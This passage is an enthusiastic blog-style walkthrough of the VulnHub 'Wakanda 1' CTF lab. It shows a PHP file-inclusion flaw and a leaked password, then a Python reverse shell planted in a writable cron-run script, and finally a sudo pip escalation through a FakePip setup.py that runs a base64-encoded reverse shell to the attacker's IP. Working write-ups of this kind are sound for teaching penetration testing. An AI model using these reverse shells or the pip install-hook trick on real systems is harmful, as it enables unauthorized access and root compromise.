AgfQogICAgICAgICAgZWxzZQogICAgICAgICAgewogICAgICAgICAgICA/PgoKICAgICAgICAgICAgTmV4dCBvcGVuaW5nIG9mIHRoZSBsYXJnZXN0IHZpYnJhbml1bSBtYXJrZXQuIFRoZSBwcm9kdWN0cyBjb21lIGRpcmVjdGx5IGZyb20gdGhlIHdha2FuZGEuIHN0YXkgdHVuZWQhCiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICB9Cj8+CiAgICAgICAgPC9wPgogICAgICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLWxnIGJ0bi1zZWNvbmRhcnkiPkxlYXJuIG1vcmU8L2E+CiAgICAgICAgPC9wPgogICAgICA8L21haW4+CgogICAgICA8Zm9vdGVyIGNsYXNzPSJtYXN0Zm9vdCBtdC1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8cD5NYWRlIGJ5PGEgaHJlZj0iIyI+QG1hbWFkb3U8L2E+PC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Zvb3Rlcj4KICAgIDwvZGl2PgoKCgogIAoKPC9ib2R5PjwvaHRtbD4=
  
  
Decoded String online;  
<?php
$password ="Niamey4Ever227!!!" ;//I have to remember it

if (isset($_GET['lang']))
{
include($_GET['lang'].".php");
}

?>
  
  
Connected to SSH (ssh mamadou@10.0.0.6 -p 3333 {password Niamey4Ever227!!!})  
  
Installed Python Shell;  
>>> import pty  
>>> pty.spawn("/bin/bash")
  
  
Found Flag;  
$ ls 
flag1.txt 
```
Now that we have all this completed, which I am STUPID EXCITED ABOUT! What else is there? Well, according to the VulnHub website, we still need to get 1 more flag, and then get our hands on the root.txt file as well!  
  
**LET'S KEEP GOING!!!!**  
  
So how easy is finding flag 2? Well we know that it is somewhere in this machine right? And we can go through every single folder to eventually find it. However, as a Pen Tester, we need to find the fastest method 
to get our information. In this case, I want to see if we can use the "locate" command. If this works, then we can locate the flag2.txt and discover what directory it is hosted in.  
```
$ locate flag2.txt  
/home/devops/flag2.txt
```
Well that was easy. Maybe a bit too easy. Next thing we need to do is cat that location & file and see what we can find out;  
```
$ cat /home/devops/flag2.txt  
cat: /home/devops/flag2.txt: Permission denied
```
I knew this was going to be too easy for us. Hmm. How can we bypass this stupid "Permission Denied"? Well, lets take a bit of a closer look. Let's see if can even CD into that directory!  
```
$ cd /home/devops  
  
$ ls -la  
total 24
drwxr-xr-x 2 devops developer 4096 Aug  5  2018 .
drwxr-xr-x 4 root   root      4096 Aug  1  2018 ..
lrwxrwxrwx 1 root   root         9 Aug  5  2018 .bash_history -> /dev/null
-rw-r--r-- 1 devops developer  220 Aug  1  2018 .bash_logout
-rw-r--r-- 1 devops developer 3515 Aug  1  2018 .bashrc
-rw-r----- 1 devops developer   42 Aug  1  2018 flag2.txt
-rw-r--r-- 1 devops developer  675 Aug  1  2018 .profile
```
I did ls -la this time so that I can get the exact details of all files & folders from within this directory. And now we can see that "flag2.txt" is read/write by the devops user. Which is a great thing to see, we just need 
to get access to the "devops" or "developer" account. But how can we do this?  
I want to see what type of passwords are stored on this machine. We can see the list of users in the /etc/passwd file like this;  
```
$ cat /etc/passwd  
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Debian-exim:x:104:109::/var/spool/exim4:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
statd:x:106:65534::/var/lib/nfs:/bin/false
avahi-autoipd:x:107:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
mamadou:x:1000:1000:Mamadou,,,,Developper:/home/mamadou:/usr/bin/python
devops:x:1001:1002:,,,:/home/devops:/bin/bash
```
Okay, and the last line is "devops:x:1001:1002:,,,:/home/devops:/bin/bash". Interesting. I am willing to bet if we can get ahold of that access, we might as well have root access. So. Next step is to see if we can 
actually make it appear to be devops. The first thing I would like to try is our common "find" function. While we are still inside of the "/home/devops/" folder, let's try a couple of commands,  
```
**To see what is easily available;**
$ find  
.
./.bashrc
./.profile
./.bash_logout
./flag2.txt
./.bash_history  
  
**Now we will use "find" to make us appear that we are devops**  
$ find / -user devops  
/srv/.antivirus.py
find: `/root': Permission denied
find: `/sys/kernel/debug': Permission denied
find: `/lost+found': Permission denied
/tmp/test
find: `/var/lib/sudo/lectured': Permission denied
find: `/var/lib/container': Permission denied
find: `/var/lib/php/sessions': Permission denied
find: `/var/cache/ldconfig': Permission denied
find: `/var/spool/exim4': Permission denied
find: `/var/spool/rsyslog': Permission denied
find: `/var/spool/cron/atspool': Permission denied
find: `/var/spool/cron/atjobs': Permission denied
find: `/var/spool/cron/crontabs': Permission denied
find: `/var/log/apache2': Permission denied
find: `/var/log/exim4': Permission denied
/home/devops
/home/devops/.bashrc
/home/devops/.profile
/home/devops/.bash_logout
/home/devops/flag2.txt
```
As we can clearly see, we are getting a plethora of "Permission Denied" issues. It would appear that we can not do anything as of right now. But, we can see that we can run and/or execute things in /tmp/tst/ as well as /home/devops/ and other directories & files. 
But what is unusual is that we have this "/srv/.antivirus.py". Why is there a Python Antivirus on here? Let's take a look! Curiosity is getting to us now!  
```
$ cat /srv/.antivirus.py  
open('/tmp/test','w').write('test')  
```
And now we have a script that opens up "/tmp/test" and writes to a file to "test". So... Let's see what is inside there!  
```
$ cat test  
test  
```
Okay. Nothing fancy there. Maybe there is more. Remember on the last CTF we did "Bandit"? Let's check out our Chron Jobs and see what we can see there!  
```
$ cd /etc/cron.d 
  
$ ls -la  
total 20
drwxr-xr-x  2 root root 4096 Aug  1  2018 .
drwxr-xr-x 92 root root 4096 Dec 29 02:16 ..
-rw-r--r--  1 root root  244 Dec 28  2014 anacron
-rw-r--r--  1 root root  670 Jun 20  2016 php
-rw-r--r--  1 root root  102 Jun 11  2015 .placeholder
```
  
Now, while we see a few things that may not actually be nothing, it does not hurt to look. You never know what you will find! So let's see what type of file "anacron" is and if we can, let's see what is inside of it!  
```
$ file anacron  
anacron: ASCII text  
  
$ cat anacron  
# /etc/cron.d/anacron: crontab entries for the anacron package

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

30 7    * * *   root    test -x /etc/init.d/anacron && /usr/sbin/invoke-rc.d anacron start >/dev/null
```
We can clearly see that "anacron" is actually doing something. But curious on what it is doing? Let's check out the "php" file. Maybe it may hold some useful information for us!  
```
$ cat php  
# /etc/cron.d/php@PHP_VERSION@: crontab fragment for PHP
#  This purges session files in session.save_path older than X,
#  where X is defined in seconds as the largest value of
#  session.gc_maxlifetime from all your SAPI php.ini files
#  or 24 minutes if not defined.  The script triggers only
#  when session.save_handler=files.
#
#  WARNING: The scripts tries hard to honour all relevant
#  session PHP options, but if you do something unusual
#  you have to disable this script and take care of your
#  sessions yourself.

# Look for and purge old sessions every 30 minutes
09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && /usr/lib/php/sessionclean
```
And from here, we can see that it is purging old sessions every 30 minutes. So every 30 minutes, this system is purging old session files. Interesting. We do have 1 more file to look into. The "placeholder". Now this may actually be nothing at all, but we have already discovered everything else, why not go ahead and try this one too!  
```
$ cat .placeholder  
# DO NOT EDIT OR REMOVE
# This file is a simple placeholder to keep dpkg from removing this directory
```
Just as suspected. It does nothing. Okay. So it looks like we are not getting anywhere with this. But there are more tricks up our sleeves. I want to play around with this antivirus python file. And we will try 
to run this script as if we are another user. 

## Reverse Python Shell  
*We have already discovered a plethora of information from the last section. But now, I want to test out this antivirus.py script. But in order to do that, we need to first understand how we can do python reverse shell.*  
  
So, we are going to do our best to change our access from mamadou to devops. And we can do that doing a Python Reverse Shell script.  
The first thing we want to do is go to Google and type in;  
Python Reverse shell cheat sheet  
This is the website I will be using for this example;  
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet  
  
So scroll down until you see the "Python 2.7" and copy that command. Once you have done that, let's go back into the srv directory and attempt to nano into this;  
```
$ cd /srv  
  
**Test to see if .antivirus.py is there;**  
$ ls -la
drwxr-xr-x  2 root   root      4096 Aug  1  2018 .
drwxr-xr-x 22 root   root      4096 Aug  1  2018 ..
-rw-r--rw-  1 devops developer   36 Aug  1  2018 .antivirus.py
  
$ nano .antivirus.py  
open('/tmp/test','w').write('test')

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
Now, for those of us that has already taken some Python courses, we know that we can import some of these settings. Let's adjust this script to make it work.  
The first thing we will do is remove the first line "open('/tmp/test/','w').write('test') and then start importing functions as well as adjust a few things to make this script work.  
When all said and done, you can copy/paste this code;  
```
import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# Change "10.0.0.4" to your IP Address. #
s.connect(("10.0.0.4",1234))
os.dup2(s.fileno(),0) 
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]) 
```
Now, on our local computer, we want to run ncat and have it listening on port 1234. So let's fire up that and get it ready to start listening!  
```
$ nc -nvlp 1234  
```
And on the tab where we have our SSH connection to the target, we will execute the python script;  
```
$ python .antivirus.py  
```
And if we look back at our desktop terminal screen, we can see;  
```
Ncat: Listening on :::2345
Ncat: Listening on 0.0.0.0:2345
Ncat: Connection from 10.0.0.6.
Ncat: Connection from 10.0.0.6:39402.  
$ 
```
Now, if we type in "id" on that screen, we should be able to see the username of the connection like so;  
```
Ncat: Listening on :::2345
Ncat: Listening on 0.0.0.0:2345
Ncat: Connection from 10.0.0.6.
Ncat: Connection from 10.0.0.6:39402.
$ id  
uid=1000(mamadou) gid=1000(mamadou) groups=1000(mamadou)
```
What is fun about this, is now we are able to use some commands as if we are actually SSH into that server. Check out some of these commands;  
``` 
Ncat: Listening on :::2345
Ncat: Listening on 0.0.0.0:2345
Ncat: Connection from 10.0.0.6.
Ncat: Connection from 10.0.0.6:39402.
$ id  
uid=1000(mamadou) gid=1000(mamadou) groups=1000(mamadou)
$ whoami  
mamadou 
$ cd /home/devops  
$ ls  
flag2.txt  
```
THIS IS COOL!!! However, the issue we are having is that we are not "devops" as we had expected to be. We are still mamadou. What I would like to do, is reboot the server.  
I know this sounds a bit strange, but have you seen the hit T.V. Show "IT Crowd"? Hello IT, have you tried turning it off and on again?  
Sometimes that will help us. Let's try it.  
**Terminal Screen of SSH Connection;**  
```
$ sudo reboot -f  
[sudo] password for mamadou: 
mamadou is not in the sudoers file.  This incident will be reported.
```
Well, mamadou is not capable of performing SUDO commands. I want to try 1 more thing right quick. Since we just tried to perform a SUDO command, let's fire up our ncat again, and try to do a reboot and see what happens.  
WELL EPIC JOB!!  
We can see from the netcat listening on that port, we was able to see this;  
/bin/sh: 0: can't access tty; job control turned off  
  
Now, let's command that "id" and see what we have!  
```
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::2345
Ncat: Listening on 0.0.0.0:2345
Ncat: Connection from 10.0.0.6.
Ncat: Connection from 10.0.0.6:39406.
/bin/sh: 0: can't access tty; job control turned off
$ id  
uid=1001(devops) gid=1002(developer) groups=1002(developer)
```
***HOLY FREAKING COW!!!*** We just exploited this python shell and now we have devops access! Let's try to cat out that file 1 more time shall we!  
``` 
$ cd home  
  
$ cd devops  
  
$ ls  
flag2.txt  
  
$ cat flag2.txt  
Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098  
```
**OH MY GAWD!** We DID IT! WE JUST FREAKING HACKED THIS!!!!  
How did this even happen? Because when we ran the chron job when tried to perform that sudo command, that is what allowed our ncat command to listen and detect that devops root user.
  
What is next? Well, we still need to get that root.txt file!  
We will escalate our privileges 1 more time to get full root access!  
  
## Sudo Privilege Escalation  
*SUDO ~ To force something to happen, even if the command does not want too!*  
One of my favorite memes of this is;  
MAN ~ Babe, make me a sandwich.  
WIFE ~ Make it yourself!  
MAN ~ sudo Babe, make me a sandwich.  
WIFE ~ OMG YES I WILL! Would you like a beer too!  
With Sudo access rights, we can literally force things to happen that we need them to. Even if it is reading hidden files, executing commands, and so much more!  
  
We can check to see what type of things we can run with our current user by using the -l command. Let's check this out.  
What I want you to do, is on the terminal we have opened up that has been listening to our server, type in the following;  
```
$ sudo -l
Matching Defaults entries for devops on Wakanda1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User devops may run the following commands on Wakanda1:
    (ALL) NOPASSWD: /usr/bin/pip
```
And this allows us to check and see what type of commands we can use as well as what directories we have access too. Since we have the ability to run "pip" command, we will take advantage of that. Why?  
This server is being ran off of the Python setup.  
What we can do, is go to google and we want to find the exploit for "usr/bin/pip exploit with sudo". So go to Google and type in;  
/usr/bin/pip exploit sudo  
  
The first result that shows up should be a Github link. Click on that link. If it does not show up for you, use this link;  
https://github.com/0x00-0x00/FakePip  
  
What we are going to want to do is run a fake pip inside of our target server. And we can easily accomplish this by doing the following;  
We could try to git clone from Github to the server, but Git is not installed. If we try wget, it does not work properly either for some reason. So, we will clone the repo on our local machine  
and then rewrite the setup.py script so that it reflects our IP Address and we can assign a different port.   
**DO NOT USE THE SAME PORT FOR NCAT!**  
*On your local machine, do this;*  
```
$ cd Desktop  
  
**Change this folder name to your desired name;**
$ mkdir PythonScripts  
  
$ git clone https://github.com/0x00-0x00/FakePip.git  
  
$ cd FakePip  
  
$ nano setup.py  
```
And the setup.py should look like this;  
```
from setuptools import setup
from setuptools.command.install import install
import base64
import os


class CustomInstall(install):
  def run(self):
    install.run(self)
    LHOST = '10.0.0.4'  # USE YOUR OWN IP ADDRESS {ifconfig}
    LPORT = 2463        # Random Port we can use. IF you used "1234" on the ncat, use something else!
    
    reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
    encoded = base64.b64encode(reverse_shell)
    os.system('echo %s|base64 -d|bash' % encoded)


setup(name='FakePip',
      version='0.0.1',
      description='This will exploit a sudoer able to /usr/bin/pip install *',
      url='https://github.com/0x00-0x00/fakepip',
      author='zc00l',
      author_email='andre.marques@esecurity.com.br',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
```
  
So how do we get this script onto the server? We will fire up our own Apache server on our local machine and copy the setup.py file into the /var/www/html directory like this;  
```
$ cp setup.py /var/www/html  
  
$ service apache2 start  
```
**PLEASE NOTE:** If you get a permission error, just redo the command with "sudo". ;)  
  
Now that we have done that, you should be able to open up your browser and type in;  
10.0.0.4/setup.py  
and that will download the python script we just edited.  
**PLEASE NOTE:** Replace 10.0.04 with your own ip address {ifconfig}  
  
Now. How do we get that onto our target server? Simple! We simply just go to the tab we have been listening on that gave us devops access and use wget;  
```
**MUST USE "http://" in order for this to work properly!**
$ wget http://10.0.0.4/setup.py  
  
$ ls  
flag2.txt
setup.py
```
Now that we have our setup.py on our target server, we need to get this up, running, and activated so that we can exploit our target!  
  
We will open up a new tab to setup a port listener on for the PORT we are using in the script. In my case, I am going to be using port 2463. 
```
$ ncat -nvlp 2463
```
And now on our target server, we will run the command like so;  
```
$ sudo /usr/bin/pip install . --upgrade --force-reinstall
Unpacking /home/devops
  Running setup.py (path:/tmp/pip-Z0z1Gg-build/setup.py) egg_info for package from file:///home/devops
    
Installing collected packages: FakePip
  Running setup.py install for FakePip
```
  
And if we go back to our tab that we are listening to on the new port, we can see that we have a new line;  
```
root@Wakanda1:/tmp/pip-Z0z1Gg-build# 
```
Let's test it out and run some commands to see if we really are root!  
```
**Pull "whoami" command;**  
$ whoami  
whoami  
root  
  
$ cd  
  
$ ls  
root.txt
  
$ cat root.txt  
 _    _.--.____.--._
( )=.-":;:;:;;':;:;:;"-._
 \\\:;:;:;:;:;;:;::;:;:;:\
  \\\:;:;:;:;:;;:;:;:;:;:;\
   \\\:;::;:;:;:;:;::;:;:;:\
    \\\:;:;:;:;:;;:;::;:;:;:\
     \\\:;::;:;:;:;:;::;:;:;:\
      \\\;;:;:_:--:_:_:--:_;:;\
       \\\_.-"             "-._\
        \\
         \\
          \\
           \\ Wakanda 1 - by @xMagass
            \\
             \\


Congratulations You are Root!

821ae63dbe0c573eff8b69d451fb21bc
```
  
**BOOM BABY!** And just like that, we have root access to the server, found the last flag and are good to go!  
  
## Thank You  
I want to say thank you for following along. And if you have any questions, comments, or issues, please feel free to reach out to me directly;  
**Email** ~ cryptoh4ck3r@proton.me  
**Twitter** ~ https://twitter.com/CryptoH4ck3r  
